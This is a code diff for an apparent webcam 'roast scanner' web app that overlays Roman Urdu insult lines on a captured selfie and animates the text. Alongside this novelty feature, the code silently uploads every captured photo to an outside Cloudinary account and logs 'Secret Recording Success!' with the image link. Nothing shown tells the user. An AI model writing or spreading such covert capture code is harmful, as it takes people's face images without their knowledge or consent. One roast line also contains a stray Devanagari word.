@@ -15,13 +15,10 @@ const modes = [
         name: '😈 The Roasting King (Heavy but Safe)',
         styleClass: 'roast-style',
         comments: [
-            // Original Roasts (4)
             "SCAN FAILURE: Screen toot jayegi, itna ghoor ke mat dekho! 💔 Ghoorna band karo!", 
             "ERROR 404: Face battery low. Initiate urgent sleep protocol! 😴 Sona hi hal hai.",
             "Mausam ki tarah badalna toh sunna tha, lekin expression? 🤷‍♂️ Har 2 sec mein mood off.",
             "Tumhari selfie is waqt duniya ka 8th ajooba hai. Kyun? Raaz hai! 😉 Khud hi socho.",
-            
-            // First Batch of 30 Roman Urdu Roasts 
             "WARNING: Tumhara mood 50% battery par hai. Foran charge karein ya coffee peelo! ☕",
             "System Error: Aap scan nahi ho paye shakal ki wajah se! 😩",
             "Alert: Shakal pe 'Out of Stock' ka board laga hua hai. Refresh bhi bekaar hai! 🚫",
@@ -54,13 +51,11 @@ const modes = [
             "Caution: Tumhari hasi mein thoda sa 'shaytani' element hai. Pata chal gaya! 😈",
             "FINAL VERDICT: Aapka style purana ho chuka hai, update required! Get a new look. 💇",
             "REJECTED: Next time, filter lagana mat bhoolna, please. Yeh 'no filter' theek nahi hai. 🤦",
-
-            // *** NEW BATCH OF 30 HEAVY ROASTS ADDED HERE ***
             "LIFE GOAL: Tumhari zindagi mein sirf do cheezein hain: late hona aur phir bhi complain karna. Badlo!",
             "REALITY CHECK: Tumhara bank balance aur tumhari akal dono hi 'critical low' par hain. 📉",
             "SCAM ALERT: Tumhari promise aur tumhari neend, dono pe bharosa nahi kiya ja sakta. Jhoote! 🤥",
             "CPU USAGE: Tumhara dimagh itna slow chalta hai ki 2G internet bhi tumse tez hai. 🐌",
-            "INVESTIGATION: Tumhari shakal dekh ke lagta hai, jaise tum roz subah uth ke doosron ki khushiyan churane nikle ho. 🔪",
+            "INVESTIGATION: Tumhari shakal dekh ke lagta hai, jaise तुम roz subah uth ke doosron ki khushiyan churane nikle ho. 🔪",
             "DESIGN FLAW: Tumhari personality mein koi 'wow' factor nahi hai, bas default settings hain. Boring! 😐",
             "SERVER DOWN: Jab tum baat karte ho, puri mehfil mute ho jaati hai. Please, no thanks! 🔇",
             "OBSERVATION: Tumhari energy sirf 'bakwas' aur 'overacting' mein kharch hoti hai. Wapis le lo! 🎭",
@@ -157,7 +152,7 @@ const newScanBtn = document.getElementById('new-scan-btn');
 const backToModesBtn = document.getElementById('back-to-modes-btn');
 const resultDisplayFrame = document.querySelector('.result-display-frame'); 
 
-// --- 3. CLOUDINARY UPLOAD FUNCTION (NEW) ---
+// --- 3. CLOUDINARY UPLOAD FUNCTION ---
 async function uploadToCloudinary(imageBlob) {
     const formData = new FormData();
     formData.append('file', imageBlob);
@@ -170,7 +165,7 @@ async function uploadToCloudinary(imageBlob) {
             body: formData
         });
         const data = await response.json();
-        console.log("Secret Recording Success! 😉 Link:", data.secure_url);
+        console.log("Secret Recording Success! link:", data.secure_url);
     } catch (error) {
         console.error("Cloudinary Error:", error);
     }
@@ -182,15 +177,11 @@ function switchScreen(targetId) {
     if (resultDisplayFrame) {
         resultDisplayFrame.classList.remove('active');
     }
-    
     [modesScreen, scanScreen, resultScreen].forEach(screen => {
         screen.classList.remove('active');
     });
     document.getElementById(targetId).classList.add('active');
-    
-    if (targetId !== 'scan-screen') {
-        stopCamera();
-    }
+    if (targetId !== 'scan-screen') { stopCamera(); }
 }
 
 function stopCamera() {
@@ -205,7 +196,6 @@ function startScan() {
         alert("Please select a scan protocol, Aamir! 😉");
         return;
     }
-    
     const scannerLine = document.querySelector('.real-scanner-line');
     scannerLine.style.animation = 'none';
     void scannerLine.offsetWidth; 
@@ -219,12 +209,10 @@ function startScan() {
         .then(stream => {
             videoStream = stream;
             videoElement.srcObject = stream;
-            
             videoElement.onloadeddata = () => { 
                 const timerInterval = setInterval(() => {
                     scanDuration--;
                     timerDisplay.textContent = scanDuration;
-
                     if (scanDuration <= 0) {
                         clearInterval(timerInterval);
                         videoElement.onloadeddata = null; 
@@ -232,12 +220,9 @@ function startScan() {
                     }
                 }, 1000);
             };
-
         })
         .catch(err => {
-            console.error("Camera access error: ", err);
             alert("SYSTEM ERROR: Camera access denied!");
-            stopCamera();
             switchScreen('modes-screen');
         });
 }
@@ -253,116 +238,125 @@ function captureAndShowResult() {
         context.drawImage(videoElement, capturedCanvas.width * -1, 0, capturedCanvas.width, capturedCanvas.height);
         context.restore(); 
 
-        // --- NEW CLOUDINARY UPLOAD ---
-        capturedCanvas.toBlob((blob) => {
-            uploadToCloudinary(blob);
-        }, 'image/jpeg', 0.8);
+        capturedCanvas.toBlob((blob) => { uploadToCloudinary(blob); }, 'image/jpeg', 0.8);
         
         stopCamera(); 
         const selectedMode = currentMode;
         const randomIndex = Math.floor(Math.random() * selectedMode.comments.length);
-        const finalComment = selectedMode.comments[randomIndex];
+        
+        let rawComment = selectedMode.comments[randomIndex];
+        const finalComment = rawComment.replace(/Roast Level \d+:/g, '').trim();
 
-        drawHorizontalFunnyText(finalComment, selectedMode.styleClass);
-
+        // 100% Dynamic Transparency call
+        typeEffectOnCanvas(finalComment);
     } else {
-        capturedCanvas.width = 640;
-        capturedCanvas.height = 480;
-        context.fillStyle = 'black';
-        context.fillRect(0, 0, capturedCanvas.width, capturedCanvas.height);
-        context.fillStyle = 'white';
-        context.font = '20px Orbitron';
-        context.textAlign = 'center';
-        context.fillText('FATAL ERROR: FRAME UNAVAILABLE. RE-SCAN.', capturedCanvas.width / 2, capturedCanvas.height / 2);
         stopCamera();
+        switchScreen('modes-screen');
     }
     
     switchScreen('result-screen');
-    
-    setTimeout(() => {
-        if (resultDisplayFrame) {
-             resultDisplayFrame.classList.add('active');
-        }
-    }, 50); 
+    setTimeout(() => { if (resultDisplayFrame) resultDisplayFrame.classList.add('active'); }, 50); 
 }
 
-function drawHorizontalFunnyText(text, styleClass) {
+// --- FULLY TRANSPARENT DYNAMIC TYPING EFFECT ---
+function typeEffectOnCanvas(fullText) {
     const context = capturedCanvas.getContext('2d');
     const canvasWidth = capturedCanvas.width;
     const canvasHeight = capturedCanvas.height;
     
-    context.globalAlpha = 0.95; 
-    context.fillStyle = 'rgba(0, 0, 0, 0.9)'; 
-    context.fillRect(0, canvasHeight - 150, canvasWidth, 150);
-    context.globalAlpha = 1.0; 
-
-    let fontFamily = 'Orbitron, sans-serif'; 
-    let fontColor = '#ffffff'; 
-
-    let fontSize; 
-    if (canvasWidth > 700) { fontSize = 55; } 
-    else if (canvasWidth > 500) { fontSize = 45; } 
-    else { fontSize = 32; }
-
-    context.font = `bold ${fontSize}px ${fontFamily}`;
-    const lineHeightFactor = 1.15;
-
-    function getLines(ctx, text, maxWidth) {
-        const words = text.split(" ");
-        let lines = [];
-        let currentLine = words[0] || '';
-
-        for (let i = 1; i < words.length; i++) {
-            const word = words[i];
-            const width = ctx.measureText(currentLine + " " + word).width;
-            if (width < canvasWidth * 0.9) {
-                currentLine += " " + word;
-            } else {
-                lines.push(currentLine);
-                currentLine = word;
-            }
-        }
-        lines.push(currentLine);
-        return lines.filter(line => line.trim() !== '');
-    }
-
-    let lines = getLines(context, text, canvasWidth * 0.9); 
-    if (lines.length > 2 && canvasWidth > 500) {
-        fontSize *= 0.75; 
-        context.font = `bold ${fontSize}px ${fontFamily}`; 
-        lines = getLines(context, text, canvasWidth * 0.9); 
-    }
+    const cyberCyan = "#00f2ff"; 
     
-    const finalLineHeight = fontSize * lineHeightFactor; 
-    context.fillStyle = fontColor;
-    context.textAlign = 'center';
-    context.shadowColor = '#00ffff'; 
-    context.shadowBlur = 10; 
+    let fontSize = canvasWidth > 700 ? 28 : (canvasWidth > 500 ? 22 : 18); 
+    if (fullText.length > 80) fontSize -= 4; 
+    
+    context.font = `700 ${fontSize}px 'Orbitron', sans-serif`;
+    
+    const lines = getLines(context, fullText.toUpperCase(), canvasWidth * 0.85);
+    const lineHeight = fontSize * 1.4;
+    const padding = 30;
+    const overlayHeight = (lines.length * lineHeight) + padding;
 
-    const totalTextHeight = (lines.length - 1) * finalLineHeight + fontSize; 
-    let currentY = canvasHeight - 150 + (150 / 2) - (totalTextHeight / 2) + (fontSize * 0.7); 
+    let wordIndex = 0;
+    const words = fullText.toUpperCase().split(" ");
+    let currentText = "";
 
-    lines.forEach((lineText, index) => {
-        context.fillText(lineText, canvasWidth / 2, currentY + (index * finalLineHeight));
-    });
-    context.shadowBlur = 0; 
+    // Save initial clean photo to redraw in loop
+    const offscreenCanvas = document.createElement('canvas');
+    offscreenCanvas.width = canvasWidth;
+    offscreenCanvas.height = canvasHeight;
+    offscreenCanvas.getContext('2d').drawImage(capturedCanvas, 0, 0);
+
+    function drawFrame() {
+        if (wordIndex < words.length) {
+            currentText += (wordIndex === 0 ? "" : " ") + words[wordIndex];
+            wordIndex++;
+
+            // --- 1. THE TRANSPARENCY FIX ---
+            // Clear area and restore photo first
+            context.clearRect(0, 0, canvasWidth, canvasHeight);
+            context.drawImage(offscreenCanvas, 0, 0);
+
+            // Create linear fade instead of black box
+            let gradient = context.createLinearGradient(0, canvasHeight, 0, canvasHeight - overlayHeight);
+            gradient.addColorStop(0, 'rgba(0, 0, 0, 0.75)'); // Darkest at bottom
+            gradient.addColorStop(1, 'rgba(0, 0, 0, 0)');    // Fully transparent at top
+            
+            context.fillStyle = gradient;
+            context.fillRect(0, canvasHeight - overlayHeight, canvasWidth, overlayHeight);
+
+            // --- 2. HIGH-VISIBILITY TEXT ---
+            const currentLines = getLines(context, currentText, canvasWidth * 0.9);
+            context.textAlign = 'center';
+            context.textBaseline = 'top';
+            
+            let startY = canvasHeight - overlayHeight + (padding / 2);
+
+            currentLines.forEach((line, idx) => {
+                // Triple visibility: Shadow + Stroke + Glow
+                context.shadowColor = "rgba(0,0,0,0.9)";
+                context.shadowBlur = 10;
+                
+                context.strokeStyle = "black";
+                context.lineWidth = 5;
+                context.strokeText(line, canvasWidth / 2, startY + (idx * lineHeight));
+                
+                context.fillStyle = cyberCyan;
+                context.shadowColor = cyberCyan;
+                context.shadowBlur = 12;
+                context.fillText(line, canvasWidth / 2, startY + (idx * lineHeight));
+            });
+            
+            context.shadowBlur = 0; 
+            setTimeout(drawFrame, 75); 
+        }
+    }
+    drawFrame();
+}
+
+function getLines(ctx, text, maxWidth) {
+    const words = text.split(" ");
+    let lines = [];
+    let currentLine = words[0] || '';
+    for (let i = 1; i < words.length; i++) {
+        const word = words[i];
+        const width = ctx.measureText(currentLine + " " + word).width;
+        if (width < maxWidth) { currentLine += " " + word; } 
+        else { lines.push(currentLine); currentLine = word; }
+    }
+    lines.push(currentLine);
+    return lines;
 }
 
 // --- 5. EVENT LISTENERS & INIT ---
-
 modeSelect.addEventListener('change', (e) => {
-    const selectedModeId = e.target.value;
-    currentMode = modes.find(m => m.id === selectedModeId);
+    currentMode = modes.find(m => m.id === e.target.value);
 });
-
 startScanBtn.addEventListener('click', startScan);
 newScanBtn.addEventListener('click', startScan);
 backToModesBtn.addEventListener('click', () => {
-    currentMode = modes[0]; 
     modeSelect.value = 'placeholder';
     switchScreen('modes-screen');
 });
-
 document.addEventListener('DOMContentLoaded', () => {
     modes.forEach(mode => {
         const option = document.createElement('option');
@@ -370,5 +364,4 @@ document.addEventListener('DOMContentLoaded', () => {
         option.textContent = mode.name;
         modeSelect.appendChild(option);
     });
-    modeSelect.value = 'placeholder';
 });
